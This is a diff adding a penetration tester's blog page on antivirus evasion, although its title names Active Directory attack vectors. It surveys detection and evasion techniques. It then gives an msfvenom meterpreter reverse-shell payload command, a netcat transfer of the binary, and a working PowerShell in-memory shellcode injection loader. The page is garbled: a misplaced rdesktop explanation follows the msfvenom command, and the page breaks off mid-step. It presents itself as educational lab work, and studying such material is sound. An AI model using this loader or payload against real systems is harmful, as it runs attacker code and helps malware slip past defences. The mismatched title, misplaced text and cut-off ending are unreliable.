@@ -1,0 +1,258 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Case Studies - Active Directory Initial Attack Vectors // FMisi&#39;s security.log</title>
+    <link rel="shortcut icon" href="../favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="FMisi" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="../../stiluslapom.css" />
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Case Studies - Active Directory Initial Attack Vectors"/>
+
+    <meta property="og:title" content="Case Studies - Active Directory Initial Attack Vectors" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://fmisi.github.io/notes/0-info-gathering/" /><meta property="article:section" content="case-studies" />
+<meta property="article:published_time" content="2022-07-13T23:18:05+13:00" />
+<meta property="article:modified_time" content="2022-07-13T23:18:05+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://fmisi.github.io/"><img class="app-header-avatar" src="../../avatar.jpg" alt="FMisi" /></a>
+      <span class="app-header-title">FMisi</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="../../index.html">/root</a>
+             - 
+          
+          <a class="app-header-menu-item" href="../../htb/index.html">/htb</a>
+             - 
+          
+		  <a class="app-header-menu-item" href="../../case-studies/index.html">/case-studies</a>
+             - 
+		  
+          <a class="app-header-menu-item" href="../../notes/index.html">/notes</a>
+      </nav>
+      <p>FMisi is a penetration tester.</p></br>
+      <a style="font-size: smaller;" href="../../../privacy/index.html">Privacy Policy</a></br>
+    </header>
+    <main class="app-container">
+
+  <article class="post">
+    <header class="post-header">
+      <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="fmisi" data-description="Support me on Buy me a coffee!" data-message="" data-color="#40DCA5" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+      <script src="/js/crypto-js.min.js"></script>
+      <script src="/js/dice.js"></script>
+      <h1 class ="post-title">Case Studies - Active Directory Initial Attack Vectors</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Apr 30, 2023
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          20 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+<h3 id="intro">Intro</h3>
+In this blog post, we will delve into the intriguing world of antivirus evasion techniques, exploring the various ways in which malicious actors attempt to outmaneuver security software.<br/>From the ingenious obfuscation of malicious code to polymorphic malware that shape-shifts with each attack, we will uncover the dark arts that threat actors employ to bypass even the most resilient antivirus defenses.<br/>
+However, this blog post is not meant to serve as a guidebook for aspiring hackers; quite the contrary.<br/>Our primary focus will be to shine a light on these stealthy strategies so that both security professionals and ordinary users can better understand the threats they face.<br/>With knowledge comes power, and by comprehending the tactics, we can fortify our defenses and develop effective mitigation solutions to safeguard our digital realm.<br/>
+<br/>
+<h3 id="aebg">Background</h3>
+<img src="lab.png" width="75%" height="50%" alt="lab.png"><br/><br/>
+The real time protection of the antivirus we test against is turned on unless otherwise stated.<br/>
+Both machines have nc.exe installed.
+<br/>
+<h3 id="verybasicae_whatisa">What is Antivirus Software?</h3>
+Antivirus is a type of application designed to prevent, detect, and remove malicious software.<br/>
+It was originally designed to simply remove computer viruses.<br/>
+However, with the development of other types of malware, antivirus softwares now typicly include additional protections, such as firewalls, application scanners, and more.<br/>
+<br/>
+<h3 id="verybasicae_dm">Detection Methods</h3>
+There are multiple methods that antivirus manufacturers utilize to detect malicious software.<br/>
+The most common methods used are: signature-based detection, heuristic-based detection, and behavior-based detection.<br/><br/>
+<b>Signature-based detection</b>: Signature-based antivirus detection is mostly considered a blacklist technology. In other words,
+the filesystem is scanned for known malware signatures and if any are detected, the offending
+files are quarantined. This implies that, with correct tools, we can bypass antivirus software that
+relies on this detection method fairly easily. Specifically, we can bypass signature-based detection
+by simply changing or obfuscating the contents of a known malicious file in order to break the
+identifying byte sequence (or signature).<br/><br/>
+<b>Heuristic-Based Detection</b>: Heuristic-Based detection is a detection method that relies on various rules and algorithms to
+  determine whether or not an action is considered malicious. This is often achieved by stepping
+  through the instruction set of a binary file or by attempting to decompile and then analyze the
+  source code. The idea is to look for various patterns and program calls (as opposed to simple.
+  byte sequences) that are considered malicious.<br/><br/>
+<b>Behavior-Based Detection</b>: Behavior-Based detection dynamically analyzes the behavior of a binary file. This
+  is often achieved by executing the file in question in an emulated environment, such as a small
+  virtual machine, and looking for behaviors or actions that are considered malicious.<br/><br/>
+It is important to note that the majority of antivirus developers use a combination of these detection
+methods to achieve higher detection rates.<br/>
+<br/>
+<h3 id="verybasicae_em">Evasion Methods</h3>
+Generally speaking, antivirus evasion falls into two broad categories: on-disk and in-memory.<br/><b>On-disk evasion</b> focuses on modifying malicious files physically stored on disk in an attempt to evade
+AV detection.<br/>Given the maturity of AV file scanning, modern malware often attempts <b>in-memory
+evasion</b>, avoiding the disk entirely.<br/>
+<br/>
+<h4 id="verybasicae_od">On-disk Evasion</h4>
+To begin our discussion of evasion, we will first look at various techniques used to obfuscate files
+stored on a physical disk.<br/>
+<ul>
+<li><b>Packers</b>: Modern on-disk malware obfuscation can take many forms.<br/>One of the earliest ways of avoiding
+  detection involved the use of packers.<br/> Given the high cost of disk space and slow network
+  speeds during the early days of the Internet, packers were originally designed to simply reduce
+  the size of an executable.<br/>Unlike modern “zip” compression techniques, packers generate an
+  executable that is not only smaller, but is also functionally equivalent with a completely new
+  binary structure.<br/>The resultant file has a new signature and as a result, can effectively bypass
+  older and more simplistic AV scanners.<br/>Even though some modern malware uses a variation of
+  this technique, the use of UPX and other popular packers alone is not sufficient for evasion of
+  modern AV scanners.</li><br/>
+<li><b>Obfuscators</b>: Obfuscators reorganize and mutate code in a way that makes it more difficult to reverse-
+  engineer.<br/>This includes replacing instructions with semantically equivalent ones, inserting
+  irrelevant instructions or “dead code”, splitting or reordering functions, and so on.<br/>Although
+  primarily used by software developers to protect their intellectual property, this technique also can be
+  effective against signature-based AV detection.</li><br/>
+<li><b>Crypters</b>: A crypter software cryptographically alters executable code, adding a decrypting stub that
+  restores the original code upon execution.<br/>This decryption happens in-memory, leaving only the
+  encrypted code on-disk. Encryption has become foundational in modern malware as one of the
+  most effective AV evasion techniques.</li><br/>
+<li><b>Software Protectors</b>: Highly effective antivirus evasion requires a combination of all of the previous techniques in
+  addition to other advanced ones, including anti-reversing, anti-debugging, virtual machine
+  emulation detection, and so on.<br/>In most cases, software protectors were designed for legitimate
+  purposes but can also be used to bypass AV detection.<br/>
+  Most of these techniques may appear simple at a high-level but they are actually quite complex.<br/>
+Because of this, there are currently few actively-maintained free tools that provide acceptable
+antivirus evasion.<br/>Among commercially available tools, The Enigma Protector in particular can
+successfully be used to bypass antivirus products. However, it is not always the case.
+</li><br/>
+</ul>
+<h4 id="verybasicae_im">In-memory Evasion</h4>
+In-Memory Injections, also known as PE Injection is a popular technique used to bypass
+antivirus products. Rather than obfuscating a malicious binary, creating new sections, or
+changing existing permissions, this technique instead focuses on the manipulation of volatile
+memory.<br/>One of the main benefits of this technique is that it does not write any files to disk,
+which is one the main areas of focus for most antivirus products.<br/>
+There are several evasion techniques that do not write files to disk.<br/>
+I will cover in-memory injection using PowerShell in detail and
+cover the others too which rely on low level programming background in languages such as C/C++.</br></br>
+<ul>
+  <li><b>Remote Process Memory Injection</b>: This technique attempts to inject the payload into another valid PE that is not malicious. The
+    most common method of doing this is by leveraging a set of Windows APIs.<br/>First, we would
+    use the OpenProcess function to obtain a valid HANDLE to a target process that we have
+    permissions to access.<br/>After obtaining the HANDLE, we would allocate memory in the context of
+    that process by calling a Windows API such as VirtualAllocEx.<br/>Once the memory has been
+    allocated in the remote process, we would copy the malicious payload to the newly allocated
+    memory using WriteProcessMemory.<br/>After the payload has been successfully copied, it is
+    usually executed in memory in a separate thread using the CreateRemoteThread API.<br/>
+    This sounds complex, but we will use a similar technique in the following example, using
+    PowerShell to do most of the heavy lifting and perform a very similar but simplified attack
+    targeting a local powershell.exe instance.</li><br/>
+  <li><b>Reflective DLL Injection</b>: Unlike regular DLL injection, which implies loading a malicious DLL from disk using the
+    LoadLibrary API, this technique attempts to load a DLL stored by the attacker in the process
+    memory.
+    The main challenge of implementing this technique is that LoadLibrary does not support loading a
+    DLL from memory. Furthermore, the Windows operating system does not expose any APIs that can handle this either. Attackers who choose to use this technique must write their own version
+    of the API that does not rely on a disk-based DLL.</li><br/>
+  <li><b>Process Hollowing</b>: When using process hollowing to bypass antivirus software, attackers first launch a non-
+    malicious process in a suspended state.<br/>Once launched, the image of the process is removed
+    from memory and replaced with a malicious executable image.<br/>Finally, the process is then
+    resumed and malicious code is executed instead of the legitimate process.</li><br/>
+  <li><b>Inline hooking</b>: As the name suggests, this technique involves modifying memory and introducing a hook
+    (instructions that redirect the code execution) into a function to point the execution flow to our
+    malicious code.<br/>Upon executing our malicious code, the flow will return back to the modified
+    function and resume execution, appearing as if only the original code had executed.
+  </li><br/>
+  </ul>
+<h3 id="verybasicae_prace">AV Evasion: Practical Example</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.100 LPORT=4444 -f exe > binary.exe<br/>[...]<br/>#</span>
+</code></div>
+Here, -x changes default bandwidth performance behaviour for RDP5. By default only theming is enabled, and all other options are disabled (corresponding to modem (56 Kbps)). Setting experience to b[roadband] enables menu animations and full window dragging. Setting experience to l[an] will also enable the desktop wallpaper. Setting experience to m[odem] disables all (including themes). Experience can also be a hexidecimal number containing the flags.</br></br>
+Uploading the binary.exe file to <a href="https://www.virustotal.com/gui/home/upload">virustotal.com</a> we see that a lot of antivirus vendors detected the file as malicious.</br></br>
+<img src="vt.png" height="40%" width="75%" alt="vt.png">
+VirusTotal is convenient but it generates a hash for each unique submission, which is then shared with all participating AV vendors.<br/>
+We will see that we can use <a href="https://antiscan.me">AntiScan.Me</a> instead.</br>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># rdesktop 10.11.0.22 -u lab -p lab -g 1024x768 -x 0x80</span>
+</code></div>
+Here, -x changes default bandwidth performance behaviour for RDP5. By default only theming is enabled, and all other options are disabled (corresponding to modem (56 Kbps)). Setting experience to b[roadband] enables menu animations and full window dragging. Setting experience to l[an] will also enable the desktop wallpaper. Setting experience to m[odem] disables all (including themes). Experience can also be a hexidecimal number containing the flags.</br></br>
+We set up a netcat listener on the Windows target.<br/>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span><span>&gt; nc -lvnp 4455 &gt; C:\Users\lab\Desktop\binary.exe</span>
+</code></div>
+We set up netcat on our Kali machine to send the binary.exe file - previously generated with msfvenom - to the Windows target.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># nc -w 3 10.11.0.22 4455 &lt; binary.exe</span>
+</code></div><br/>
+<h4 id="iwontgiveitanid">PowerShell In-Memory Injection</h4>
+Below, we see a basic template script that performs in-memory injection:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>$code = '
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
+flAllocationType, uint flProtect);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
+IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+[DllImport("msvcrt.dll")]
+public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+
+$winFunc =
+Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
+
+[Byte[]];
+[Byte[]]$sc = &lt;place your shellcode here&gt;;
+
+$size = 0x1000;
+
+if ($sc.Length -gt 0x1000) {$size = $sc.Length};
+
+$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
+
+for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i),
+$sc[$i], 1)};
+
+$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };</span>
+</code></div><br/>
+The script sets the size of the allocated memory block ($size) to 0x1000 (4096 bytes) if the shellcode length is greater than 4096 bytes. While this ensures that the memory allocation is sufficient to hold the shellcode, it doesn't take into account cases where the shellcode length is smaller than 4096 bytes. If the shellcode is smaller, there will be unused memory, which is not efficient. Instead, we can directly use the length of the shellcode to determine the size of the memory allocation:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps" data-lang="ps"><span style="display:flex;"><span><span>$sc = &lt;place your shellcode here&gt;;<br/>$size = $sc.Length;</span></code></div>
+The script lacks error handling, which might lead to issues if, for example, the memory allocation fails or if the shellcode contains invalid characters for the memory operations.<br/>
+We can modify the template script to correct these issues, but it is not necessary as these are not critical issues and it will do the job anyway.<br/><br/>
+The script starts by importing VirtualAlloc428 and CreateThread429 from kernel32.dll as well as
+memset from msvcrt.dll. These functions will allow us to allocate memory, create an execution
+thread, and write arbitrary data to the allocated memory, respectively. Once again, notice that we
+are allocating the memory and executing a new thread in the current process (powershell.exe),
+rather than a remote one.<br/><br/>
+The script then allocates a block of memory using VirtualAlloc, takes each byte of the payload
+stored in the $sc byte array, and writes it to our newly allocated memory block using memset.<br/><br/>
+As a final step, our in-memory written payload is executed in a separate thread using
+CreateThread.<br/><br/>
+We generate a shellcode with msfvenom:<br/>
+
+</br></br></br>
+~Thank you for reading~
+<h3 id="useful-references">Useful references</h3>
+<ul>
+<li><a href="https://www.cybrary.it/blog/advanced-exe-multi-protection-reverse-engineering-free-tools">Advanced EXE Multi Protection Against Reverse Engineering with Free Tools</a></li>
+<li><a href="https://www.youtube.com/watch?v=9pwMCHlNma4">AV Evasion - Mimikatz</a></li>
+<li><a href="https://www.youtube.com/watch?v=C2cgvpN44is">Advanced Windows Logging - Finding What AV Missed</a></li>
+<li><a href="https://www.youtube.com/watch?v=3eROsG_WNpE">All About DLL Hijacking</a></li>
+<li><a href="https://www.offsec.com/blog/">OffSec Blog</a></li>
+<li><a href="https://linux.die.net/man/">Linux Man Pages</a></li>
+</ul>
+	<div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
